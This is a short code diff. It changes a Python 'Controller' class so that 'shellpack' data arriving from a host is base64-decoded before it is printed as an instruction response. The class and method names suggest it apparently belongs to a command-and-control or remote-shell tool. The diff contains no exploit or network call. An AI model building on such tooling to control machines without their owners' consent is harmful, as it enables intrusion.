@@ -31,7 +31,7 @@ class Controller(Host):
         return
 
     def instruction(self, shellpack):
-        print(f"Instruction Response:\n{shellpack['data'].decode()}")
+        print(f"Instruction Response:\n{base64.b64decode(shellpack['data'].decode()).decode()}")
         
 #    def push_to_db(self, target: Target):
 
